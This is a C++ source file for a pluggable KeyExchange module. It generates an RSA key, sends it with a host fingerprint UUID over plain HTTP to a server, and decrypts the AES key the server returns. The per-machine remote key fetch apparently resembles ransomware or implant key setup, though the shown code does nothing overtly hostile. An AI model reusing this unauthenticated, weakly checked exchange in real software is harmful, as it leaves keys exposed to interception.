#include "KeyExchange.h"
#include "Fingerprint.h"
#include <openssl/pem.h>
#include <openssl/err.h>
#include <curl/curl.h>
#include <vector>
#include <iostream>
#include <sstream>

KeyExchange::KeyExchange(const std::string& url) : server_url_(url), rsa_(nullptr) {}

KeyExchange::~KeyExchange() {
    if (rsa_) RSA_free(rsa_);
}

void KeyExchange::generate_rsa() {
    rsa_ = RSA_new();
    BIGNUM* e = BN_new();
    BN_set_word(e, RSA_F4);
    RSA_generate_key_ex(rsa_, 4096, e, nullptr);
    BN_free(e);
}

std::string KeyExchange::public_key_pem() const {
    BIO* bio = BIO_new(BIO_s_mem());
    PEM_write_bio_RSAPublicKey(bio, rsa_);
    char* data;
    long len = BIO_get_mem_data(bio, &data);
    std::string pem(data, len);
    BIO_free(bio);
    return pem;
}

static size_t write_cb(void* contents, size_t size, size_t nmemb, void* userp) {
    ((std::string*)userp)->append((char*)contents, size * nmemb);
    return size * nmemb;
}

std::string KeyExchange::base64_decode(const std::string& in) {
    BIO* b64 = BIO_new(BIO_f_base64());
    BIO* bio = BIO_new_mem_buf(in.data(), in.size());
    bio = BIO_push(b64, bio);
    BIO_set_flags(bio, BIO_FLAGS_BASE64_NO_NL);
    std::vector<char> buf(in.size());
    int len = BIO_read(bio, buf.data(), buf.size());
    BIO_free_all(bio);
    return std::string(buf.data(), len);
}

std::string KeyExchange::send_public_key(const std::string& uuid) {
    CURL* curl = curl_easy_init();
    std::string response;
    if(!curl) return response;
    std::string pub = public_key_pem();
    std::string payload = "{\"uuid\":\"" + uuid + "\",\"public_key\":\"";
    std::string escaped;
    char* enc = curl_easy_escape(curl, pub.c_str(), pub.length());
    if(enc) {
        escaped = enc;
        curl_free(enc);
    }
    payload += escaped + "\"}";

    curl_easy_setopt(curl, CURLOPT_URL, (server_url_ + "/key_exchange").c_str());
    curl_easy_setopt(curl, CURLOPT_POSTFIELDS, payload.c_str());
    curl_easy_setopt(curl, CURLOPT_WRITEFUNCTION, write_cb);
    curl_easy_setopt(curl, CURLOPT_WRITEDATA, &response);
    curl_easy_perform(curl);
    curl_easy_cleanup(curl);
    return response;
}

void KeyExchange::init() {
    generate_rsa();
    auto fp = collect_fingerprint();
    std::string resp = send_public_key(fp.uuid);
    if(resp.empty()) {
        std::cerr << "Key exchange failed" << std::endl;
        return;
    }
    // expect JSON {"aes_key":"<base64>"}
    auto pos = resp.find("aes_key");
    if(pos == std::string::npos) return;
    auto start = resp.find('"', pos + 8);
    auto end = resp.find('"', start + 1);
    if(start == std::string::npos || end == std::string::npos) return;
    std::string enc_b64 = resp.substr(start+1, end-start-1);
    std::string enc = base64_decode(enc_b64);
    std::vector<unsigned char> out(RSA_size(rsa_));
    int len = RSA_private_decrypt(enc.size(), (unsigned char*)enc.data(), out.data(), rsa_, RSA_PKCS1_OAEP_PADDING);
    if(len <= 0) {
        std::cerr << "RSA decrypt failed" << std::endl;
        return;
    }
    aes_key_.assign((char*)out.data(), len);
}

extern "C" Module* create_module() { return new KeyExchange("http://localhost:5000"); }
